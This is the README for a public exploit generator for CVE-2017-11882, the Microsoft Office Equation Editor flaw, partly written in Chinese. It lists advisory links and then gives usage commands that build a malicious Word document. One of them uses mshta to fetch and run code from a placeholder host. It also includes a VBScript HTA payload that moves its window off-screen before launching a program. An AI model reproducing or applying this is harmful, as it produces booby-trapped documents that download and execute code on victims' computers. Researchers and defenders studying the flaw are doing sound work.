# CVE-2017-11882

原脚本来自于 https://github.com/embedi/CVE-2017-11882


CVE-2017-11882:
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/

MITRE CVE-2017-11882:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882

Research:
https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about

Patch analysis:
https://0patch.blogspot.ru/2017/11/did-microsoft-just-manually-patch-their.html

DEMO PoC exploitation:
https://www.youtube.com/watch?v=LNFG0lktXQI&lc=z23qixrixtveyb2be04t1aokgz10ymfjvfkfx1coc3qhrk0h00410


## Usage


```python
python Command_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o test.doc
```

use mshta
```python
python Command_CVE-2017-11882.py -c "mshta http://site.com/abc" -o test.doc
```
abc
```html
<HTML> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD> 
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -2000,-2000
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "calc.exe"
self.close
</script>
<body>
demo
</body>
</HEAD> 
</HTML> 

```

>命令长度不能超过43 bytes

# Sample exploit for CVE-2017-11882 (starting calc.exe as payload)

`example` folder holds an .rtf file which exploits CVE-2017-11882 vulnerability and runs calculator in the system.
